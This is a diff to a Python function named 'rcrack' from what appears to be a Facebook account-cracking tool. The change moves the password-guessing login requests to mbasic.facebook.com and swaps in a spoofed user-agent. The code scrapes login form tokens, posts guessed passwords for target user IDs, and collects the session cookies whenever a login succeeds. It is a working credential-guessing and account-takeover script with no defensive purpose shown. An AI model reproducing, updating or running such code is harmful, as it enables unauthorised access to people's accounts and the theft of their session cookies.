@@ -152,7 +152,7 @@ def rcrack(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sGS XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -163,7 +163,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
    		 'method': 'GET',
 		    'scheme': 'https', 
 		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -171,12 +171,11 @@ def rcrack(uid,pwx,tl):
 		    'cache-control': 'max-age=0',
 		    'sec-fetch-dest': 'document',
 		    'sec-fetch-mode': 'navigate',
- 		   'sec-fetch-site': 'none',
- 		   'sec-fetch-user': '?1',
-   		 'upgrade-insecure-requests': '1',
-    		'user-agent': 'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3',
-		    'viewport-width': '980',}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+		    'sec-fetch-site': 'none',
+  		  'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+ 		   'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36 OPT/2.6',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
